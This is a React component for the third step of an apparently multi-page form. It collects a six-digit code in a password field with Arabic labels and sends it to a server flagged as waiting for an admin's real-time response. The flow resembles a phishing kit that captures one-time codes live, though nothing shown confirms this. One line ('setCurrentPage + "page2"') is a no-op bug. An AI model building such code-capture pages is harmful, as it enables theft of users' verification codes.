import Input from "@/components/Input";
import Main from "@/components/Main";
import { Button } from "@/components/ui/button";
import { MAIN_BTN } from "@/constants/data";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";

function Page3() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });

  function sendData(data: FieldValues) {
    sendDataToServer({
      data,
      current: "page3",
      nextPage: "page4",
      waitingForAdminResponse: true,
    });
  }

  useEffect(() => {
    // This Step Are Necessary
    setCurrentPage + "page2";
  }, []);
  return (
    <Main>
      <form
        className="flex flex-col flex-1 gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <Input
          errors={errors}
          register={register}
          id="code"
          label="رمز"
          type="password"
          isAr
          options={{
            required: "this field is required",
            pattern: {
              value: /^[0-9]{6}$/,
              message: "يجب كتابة رمز مكون من ستة ارقام",
            },
          }}
        />

        <div className="flex items-end flex-1">
          <Button className={MAIN_BTN + " w-[150px] mx-auto"}>التالي</Button>
        </div>
      </form>
    </Main>
  );
}

export default Page3;
